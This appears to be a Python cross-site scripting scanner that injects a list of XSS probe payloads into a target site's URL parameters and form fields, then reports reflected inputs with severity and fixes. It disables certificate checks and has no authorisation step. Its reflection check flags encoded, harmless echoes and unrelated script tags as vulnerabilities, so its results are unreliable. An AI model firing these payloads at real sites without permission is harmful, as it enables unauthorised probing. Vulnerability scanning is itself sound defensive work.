import requests
import time
import re
from urllib.parse import urlparse, urljoin, parse_qs, urlsplit
from bs4 import BeautifulSoup
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class XSSScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })
        self.session.timeout = 5  # Set default timeout
        
        # Optimized XSS payloads - reduced but effective
        self.payloads = [
            # Basic script injections
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            
            # Event handlers
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            
            # Context breaking
            "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>",
            
            # Uppercase bypass
            "<SCRIPT>alert(1)</SCRIPT>",
            
            # Javascript protocol
            "javascript:alert(1)",
            "<iframe src=javascript:alert(1)>",
        ]
        
        # Unique marker for detection
        self.unique_marker = "xss_test_" + str(int(time.time()))
        
        self.vulnerability_count = 0
        self.vulnerable_params = []
        
    def extract_forms(self, url):
        """Extract all forms from a webpage"""
        try:
            response = self.session.get(url, timeout=5, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = []
            
            # Limit to first 3 forms to avoid timeout
            for form in soup.find_all('form')[:3]:
                form_details = {
                    'action': form.get('action'),
                    'method': form.get('method', 'get').lower(),
                    'inputs': []
                }
                
                # Get all input fields (limit to first 5)
                for input_tag in form.find_all(['input', 'textarea', 'select'])[:5]:
                    input_name = input_tag.get('name')
                    input_type = input_tag.get('type', 'text')
                    if input_name:
                        form_details['inputs'].append({
                            'name': input_name,
                            'type': input_type
                        })
                
                if form_details['inputs']:  # Only add forms with inputs
                    forms.append(form_details)
            
            return forms
        except Exception as e:
            print(f"[XSS] Error extracting forms: {e}")
            return []
    
    def is_reflected(self, payload, response_text):
        """Check if payload is reflected in response with better detection"""
        # Direct match
        if payload in response_text:
            return True
        
        # HTML encoded check
        html_encoded = payload.replace('<', '&lt;').replace('>', '&gt;')
        if html_encoded in response_text:
            return True
        
        # Check for script tags
        if '<script' in payload.lower() and '<script' in response_text.lower():
            return True
        
        # Check for event handlers
        event_handlers = ['onerror', 'onload', 'onfocus', 'onclick']
        for handler in event_handlers:
            if handler in payload.lower() and handler in response_text.lower():
                return True
        
        # Check for unique marker
        if self.unique_marker in response_text:
            return True
        
        return False
    
    def test_url(self, url, max_payloads=None):
        """Enhanced test for XSS vulnerabilities"""
        print(f"[XSS] Testing URL: {url}")
        
        vulnerable_payloads = []
        tested_params = 0
        max_params = 8  # Limit total parameters to test
        
        # Test URL parameters first
        parsed = urlparse(url)
        if parsed.query and tested_params < max_params:
            query_params = parse_qs(parsed.query)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            for param in list(query_params.keys())[:3]:  # Limit to 3 URL params
                if tested_params >= max_params:
                    break
                vuln = self._test_parameter(base_url, param, 'GET')
                if vuln:
                    vulnerable_payloads.extend(vuln)
                tested_params += 1
        
        # Extract and test forms (limit testing)
        if tested_params < max_params:
            forms = self.extract_forms(url)
            for form in forms[:2]:  # Test only first 2 forms
                if tested_params >= max_params:
                    break
                    
                form_action = form['action']
                if not form_action or form_action.startswith('#'):
                    form_action = url
                elif not form_action.startswith(('http://', 'https://')):
                    form_action = urljoin(url, form_action)
                
                method = form['method'].upper()
                
                for input_field in form['inputs'][:2]:  # Test only first 2 inputs per form
                    if tested_params >= max_params:
                        break
                    param_name = input_field['name']
                    vuln = self._test_parameter(form_action, param_name, method)
                    if vuln:
                        vulnerable_payloads.extend(vuln)
                    tested_params += 1
        
        # Test common parameters only if nothing else found
        if not vulnerable_payloads and not parsed.query and not forms and tested_params < max_params:
            test_params = ['q', 'search', 'query']  # Reduced list
            for param in test_params:
                if tested_params >= max_params:
                    break
                vuln = self._test_parameter(url, param, 'GET')
                if vuln:
                    vulnerable_payloads.extend(vuln)
                tested_params += 1
        
        return vulnerable_payloads
    
    def _test_parameter(self, url, param, method='GET'):
        """Test a specific parameter for XSS"""
        vulnerabilities = []
        tested_payloads = 0
        
        for payload in self.payloads:
            if tested_payloads >= 5:  # Limit to 5 payloads per parameter
                break
            
            try:
                # Add unique marker to payload
                marked_payload = payload.replace('1', self.unique_marker)
                
                if method == 'GET':
                    response = self.session.get(
                        url,
                        params={param: marked_payload},
                        timeout=3,
                        verify=False,
                        allow_redirects=True
                    )
                else:  # POST
                    response = self.session.post(
                        url,
                        data={param: marked_payload},
                        timeout=3,
                        verify=False,
                        allow_redirects=True
                    )
                
                tested_payloads += 1
                
                # Check if payload is reflected
                if self.is_reflected(marked_payload, response.text):
                    print(f"[XSS] ✓ Vulnerability found - Parameter: {param}, Method: {method}")
                    
                    vulnerabilities.append({
                        'param': param,
                        'payload': payload,
                        'method': method,
                        'reflected': True,
                        'severity': self._get_severity(payload)
                    })
                    
                    self.vulnerability_count += 1
                    if param not in self.vulnerable_params:
                        self.vulnerable_params.append(param)
                    
                    break  # Found vulnerability, move to next parameter
                
                time.sleep(0.05)  # Reduced rate limiting
                
            except Exception as e:
                print(f"[XSS] Error testing {param}: {str(e)[:50]}")
                continue
        
        return vulnerabilities
    
    def _get_severity(self, payload):
        """Determine severity based on payload type"""
        if '<script>' in payload.lower():
            return 'high'
        elif any(event in payload.lower() for event in ['onerror', 'onload', 'onclick']):
            return 'medium'
        else:
            return 'low'
    
    def generate_report(self, results, url):
        """Generate a vulnerability report"""
        report = {
            "scan_completed": True,
            "target_url": url,
            "total_vulnerabilities": len(results),
            "vulnerable_parameters": len(self.vulnerable_params),
            "vulnerable_params_list": self.vulnerable_params,
            "vulnerabilities": results,
            "tested_payloads": len(self.payloads),
            "risk_level": "High" if len(results) > 0 else "Low",
            "recommendations": []
        }
        
        if len(results) > 0:
            report["recommendations"] = [
                "Implement proper input validation and sanitization",
                "Use output encoding/escaping for all user inputs",
                "Implement Content Security Policy (CSP) headers",
                "Use HTTPOnly and Secure flags on cookies",
                "Deploy a Web Application Firewall (WAF)"
            ]
        
        return report

def scan_xss(url):
    """Main function to scan for XSS vulnerabilities"""
    try:
        # Validate URL
        parsed = urlparse(url)
        if not parsed.scheme:
            url = "https://" + url
        
        scanner = XSSScanner()
        vulnerabilities = scanner.test_url(url)
        report = scanner.generate_report(vulnerabilities, url)
        
        print(f"[XSS] Scan completed: {len(vulnerabilities)} vulnerabilities found")
        
        return report
        
    except Exception as e:
        print(f"[XSS] Scan error: {str(e)}")
        return {
            "scan_completed": False,
            "error": str(e),
            "target_url": url,
            "total_vulnerabilities": 0,
            "vulnerable_parameters": 0,
            "vulnerabilities": [],
            "tested_payloads": 0,
            "risk_level": "Unknown"
        }
